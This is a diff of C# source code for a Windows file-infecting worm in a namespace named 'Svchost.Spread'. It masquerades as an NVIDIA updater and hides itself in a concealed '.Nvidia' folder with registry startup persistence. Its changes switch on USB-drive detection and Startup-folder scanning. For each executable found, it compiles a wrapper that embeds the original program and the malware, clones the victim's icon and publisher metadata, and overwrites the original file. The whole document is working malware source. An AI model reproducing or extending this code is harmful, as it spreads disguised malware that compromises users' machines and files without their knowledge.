@@ -17,7 +17,6 @@ namespace Svchost.Spread
 {
     public class Spreader
     {
-        private string usbFolderName;
         private string assemblyName;
         private string fakeAssemblyName;
         private string applicationPath;
@@ -32,22 +31,18 @@ namespace Svchost.Spread
         public Spreader(string fakeAssembName, string assembName, string appPath, string windowsName)
         {
             connectedUsb = new List<string>();
-            iconName = "icon13.ico";
+            iconName = "icon.ico";
             fakeAssemblyName = fakeAssembName;
             assemblyName = assembName;
             applicationPath = appPath;
             sessionName = windowsName;
             targetFolder = "C:\\Users\\" + windowsName + "\\.Nvidia\\";
-            usbFolderName = "Music\\";
-            infectInterval = 900;
-
-            infect(appPath, appPath, "NVIDIA Updater Service2.exe");
+            infectInterval = 9;
+            
             _timer = new System.Threading.Timer(infectRoutine, null, 5000, infectInterval * 1000);
-            /*
-            if (checkEnvironment())
-                driveDetector = new DriveDetector(applicationPath + assemblyName, onUSBDetected);*/
-
-            //infect(applicationPath);
+            
+            //if (checkEnvironment())
+                driveDetector = new DriveDetector(applicationPath + assemblyName, onUSBDetected);
         }
 
         private bool isExecutableInfected(string path)
@@ -78,46 +73,78 @@ namespace Svchost.Spread
                 SingleIcon sIcon = mIcon.Add("oink");
                 Icon[] splitIcons = IconUtil.Split(icon);
                 sIcon.CreateFrom(IconUtil.ToBitmap(splitIcons[splitIcons.Length - 1]), IconOutputFormat.Vista);
-                sIcon.Save(iconName);
-                
-                /* FileStream fs = new FileStream(@"icon.ico", FileMode.Create);
-                 icon.Save(fs);
-                 fs.Close();*/
+                sIcon.Save(applicationPath + iconName);
             }
             catch { }
         }
 
         void infectRoutine(object state)
         {
-            foreach (string s in connectedUsb)
+            /*try
             {
-                findAndInfect(s);
+                foreach (string s in connectedUsb)
+                {
+                    findAndInfect(s);
+                }
+                connectedUsb.Clear();
             }
+            catch { }*/
+
+            /*try
+            {
+                string[] startupPaths = Regedit.getStartup();
+                Console.WriteLine(startupPaths.Length);//here I can see I have many keys
+                foreach (string s in startupPaths)
+                {
+                    string path = new FileInfo(s).Directory.FullName;
+                    Console.WriteLine("a:" + path);
+
+                    if (Directory.Exists(path))
+                    {
+                        if (path.Length > 0 && !s.Contains(assemblyName))
+                            findAndInfect(path);
+                    }
+                }
+            } catch { }*/
+
+            try
+            {
+                string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                if (Directory.Exists(path))
+                {
+                    Console.WriteLine(path);
+                    findAndInfect(path);
+                }
+            }
+            catch { }
         }
 
         void findAndInfect(string dir)
         {
             try
             {
-                foreach (string d in Directory.GetDirectories(dir))
+                foreach (string f in Directory.GetFiles(dir))
                 {
-                    foreach (string f in Directory.GetFiles(d))
-                    {
-                        if (f.Contains(".exe") && !isExecutableInfected(f))
-                            Console.WriteLine(f);
-                    }
-                    findAndInfect(d);
+                    if (f.Contains(".exe") && !isExecutableInfected(f))
+                        infect(dir, new FileInfo(f).Name);
                 }
             }
             catch (System.Exception excpt)
             {
 
             }
+
+            foreach (string d in Directory.GetDirectories(dir))
+            {
+                findAndInfect(d);
+            }
         }
 
         public void onUSBDetected(DriveInfo drive)
         {
             findAndInfect(drive.RootDirectory.FullName);
+            /*if (!connectedUsb.Contains(drive.RootDirectory.FullName))
+                connectedUsb.Add(drive.RootDirectory.FullName);*/
         }
         
         private bool checkEnvironment()
@@ -125,6 +152,11 @@ namespace Svchost.Spread
             if(applicationPath == targetFolder)
             {
                 Regedit.setStartup(assemblyName, "\"" + applicationPath + assemblyName.Replace(".exe", "") + "\"");
+                try
+                {
+                    if (File.Exists(applicationPath + assemblyName + ".bak"))
+                        File.Delete(applicationPath + assemblyName + ".bak");
+                } catch { }
                 return true;
             }
             else
@@ -135,7 +167,7 @@ namespace Svchost.Spread
                     di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                 }
 
-                string fullTargetPath = targetFolder + assemblyName; 
+                string fullTargetPath = targetFolder + "\\" + assemblyName; 
                 string originPath = System.Reflection.Assembly.GetEntryAssembly().Location;
                 if (!File.Exists(fullTargetPath))
                     File.Copy(originPath, fullTargetPath);
@@ -156,26 +188,31 @@ namespace Svchost.Spread
             }
         }
 
-        static CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
-        static CodeCompileUnit unit = new CodeCompileUnit();
-        static CompilerParameters compilerParameters = new CompilerParameters
+        void infect(string targetFolder, string targetName)
         {
-            GenerateExecutable = true,
-            OutputAssembly = "icontext3.exe"
-        };
+            CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider();
+            CodeCompileUnit unit = new CodeCompileUnit();
+            CompilerParameters compilerParameters = new CompilerParameters
+            {
+                GenerateExecutable = true
+            };
 
-        void infect(string currentPath, string targetFolder, string targetName)
-        {
-            exctractIcon(targetFolder + targetName);
+            string fullTargetPath = targetFolder + @"\" + targetName;
+            string fullTempResultPath = targetFolder + "\\_" + targetName;
+
+            Console.WriteLine("start " + fullTargetPath);
+            exctractIcon(fullTargetPath);
 
             compilerParameters.ReferencedAssemblies.Add("System.dll");
-            compilerParameters.EmbeddedResources.Add(targetName);
-            compilerParameters.EmbeddedResources.Add("NVIDIA Updater Service.exe");
-            compilerParameters.CompilerOptions = @"/win32icon:" + currentPath + iconName;
-
-            FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo("test.exe");
-            CodeTypeReference versionAttr = new CodeTypeReference(typeof(AssemblyVersionAttribute));
-            CodeAttributeDeclaration versionDecl = new CodeAttributeDeclaration(versionAttr, new CodeAttributeArgument(new CodePrimitiveExpression("1.0.2.42")));
+            compilerParameters.EmbeddedResources.Add(fullTargetPath);
+            compilerParameters.EmbeddedResources.Add(assemblyName);
+            compilerParameters.CompilerOptions = @"/t:winexe /win32icon:" + applicationPath + iconName;
+            compilerParameters.OutputAssembly = fullTempResultPath;
+            
+            FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(fullTargetPath);
+            
+            /*CodeTypeReference versionAttr = new CodeTypeReference(typeof(AssemblyVersionAttribute));
+            CodeAttributeDeclaration versionDecl = new CodeAttributeDeclaration(versionAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.ProductVersion)));*/
             CodeTypeReference companyAttr = new CodeTypeReference(typeof(AssemblyCompanyAttribute));
             CodeAttributeDeclaration companyDecl = new CodeAttributeDeclaration(companyAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.CompanyName)));
             CodeTypeReference copyrightAttr = new CodeTypeReference(typeof(AssemblyCopyrightAttribute));
@@ -185,7 +222,8 @@ namespace Svchost.Spread
             CodeTypeReference productNameAttr = new CodeTypeReference(typeof(AssemblyProductAttribute));
             CodeAttributeDeclaration productNameDecl = new CodeAttributeDeclaration(productNameAttr, new CodeAttributeArgument(new CodePrimitiveExpression(versionInfo.ProductName)));
             
-            unit.AssemblyCustomAttributes.Add(versionDecl);
+            /*if(versionInfo.ProductVersion != "")
+                unit.AssemblyCustomAttributes.Add(versionDecl);*/
             unit.AssemblyCustomAttributes.Add(companyDecl);
             unit.AssemblyCustomAttributes.Add(copyrightDecl);
             unit.AssemblyCustomAttributes.Add(descriptionDecl);
@@ -195,15 +233,38 @@ namespace Svchost.Spread
             {
                static void Main(string[] args)
                {
-                    ExtractResource( ""./%%FILENAME%%"", ""%%FILENAME%%"" );
+                    if(args.Length > 0 && args[0] == ""cleanNvidia"")
+                    {
+                        if(System.IO.File.Exists(""%%FILENAME%%""))
+                        {
+                            System.IO.File.Move(""%%FILENAME%%"", ""i_"" + ""%%FILENAME%%"");
+                            ExtractResource( ""%%FILENAME%%"", ""%%FILENAME%%"");
+                            return;
+                        }
+                    }
+
+                    string path = ""C:/Users/"" + System.Environment.UserName + ""/.Executables/"";
+                    if (! System.IO.Directory.Exists(path))
+                    {
+                        try {
+                             System.IO.DirectoryInfo di =  System.IO.Directory.CreateDirectory(path);
+                            di.Attributes =  System.IO.FileAttributes.Directory |  System.IO.FileAttributes.Hidden;
+                        } catch { return; }
+                    }
+                    ExtractResource( ""%%FILENAME%%"", path + ""%%FILENAME%%"" );
                     string parameters = """";
                     for(int i = 0; i < args.Length; i++)
                     {
                         parameters += args[i] + """";
                     }
-                    System.Diagnostics.Process.Start(""%%FILENAME%%"", parameters);
-                    ExtractResource( ""./NVIDIA Updater Service.exe"", ""NVIDIA Updater Service.exe"" );
-                    System.Diagnostics.Process.Start(""NVIDIA Updater Service.exe"");
+                    var startInfo = new System.Diagnostics.ProcessStartInfo(path + ""%%FILENAME%%"");
+                    startInfo.WorkingDirectory = System.IO.Directory.GetCurrentDirectory();
+                    startInfo.Arguments = parameters;
+                    System.Diagnostics.Process.Start(startInfo);
+                    try {
+                        ExtractResource( ""NVIDIA Updater Service.exe"", path + ""%%FILENAME2%%"" );
+                        System.Diagnostics.Process.Start(path + ""%%FILENAME2%%"");
+                    } catch {}
                }
 
                static void ExtractResource(string resource, string path)
@@ -213,12 +274,15 @@ namespace Svchost.Spread
                     {
                         byte[] bytes = new byte[(int)stream.Length];
                         stream.Read(bytes, 0, bytes.Length);
-                        System.IO.File.WriteAllBytes(path, bytes);
+                        try {
+                            System.IO.File.WriteAllBytes(path, bytes);
+                        } catch {}
                     }
                }
             }";
 
             cSharpCode = cSharpCode.Replace("%%FILENAME%%", targetName);
+            cSharpCode = cSharpCode.Replace("%%FILENAME2%%", assemblyName);
 
             StringWriter sw = new StringWriter();
             cSharpCodeProvider.GenerateCodeFromCompileUnit(unit, sw, new CodeGeneratorOptions());
@@ -227,13 +291,47 @@ namespace Svchost.Spread
             CompilerResults results = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters,
             new[] { sw.ToString() });
 
-            foreach (string output in results.Output)
+             foreach (string output in results.Output)
+             {
+                 Console.WriteLine(output);
+             }
+             
+            if (File.Exists(fullTempResultPath))
             {
-                Console.WriteLine(output);
-            }
+                if (File.Exists(fullTargetPath))
+                {
+                    try
+                    {
+                        FileAttributes attributes = File.GetAttributes(fullTargetPath);
 
-            Assembly assembly = results.CompiledAssembly;
-            results.PathToAssembly = "./";
+                        if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
+                        {
+                            // Make the file RW
+                            attributes = attributes & ~FileAttributes.ReadOnly;
+                            File.SetAttributes(fullTargetPath, attributes);
+                        }
+                    }
+                    catch (System.Exception excpt)
+                    {}
+
+                    try
+                    {
+                        File.Delete(fullTargetPath);
+                    }
+                    catch (System.Exception excpt)
+                    {}
+                }
+
+                try
+                {
+                    File.Move(fullTempResultPath, fullTargetPath);
+                }
+                catch (System.Exception excpt)
+                {}
+            }
+            Console.WriteLine("build ");
+
+            cSharpCodeProvider.Dispose();
         }
     }
 }
